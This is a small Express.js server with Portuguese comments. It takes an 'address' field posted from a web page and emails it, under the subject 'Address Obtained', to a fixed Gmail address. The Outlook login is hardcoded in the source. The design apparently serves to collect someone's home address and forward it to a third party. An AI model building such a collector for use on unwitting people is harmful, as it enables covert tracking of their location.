const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Configuração para servir arquivos estáticos (HTML)
app.use(express.static(path.join(__dirname, 'public')));

// Middleware para parsing de JSON
app.use(bodyParser.json());

// Endpoint para enviar e-mail
app.post('/send-email', (req, res) => {
    const { address } = req.body;

    const transporter = nodemailer.createTransport({
        service: 'outlook',
        auth: {
            user: 'jackgomes411@outlook.com',
            pass: 'sua-senha',
        },
    });

    const mailOptions = {
        from: 'jackgomes411@outlook.com',
        to: 'helenosouza458@gmail.com',
        subject: 'Endereço Obtido',
        text: `Meu endereço completo é: ${address}`,
    };

    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            return res.status(500).send(error.toString());
        }
        res.send('Email enviado: ' + info.response);
    });
});

// Servir o arquivo HTML quando acessado via root
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar o servidor
app.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
});
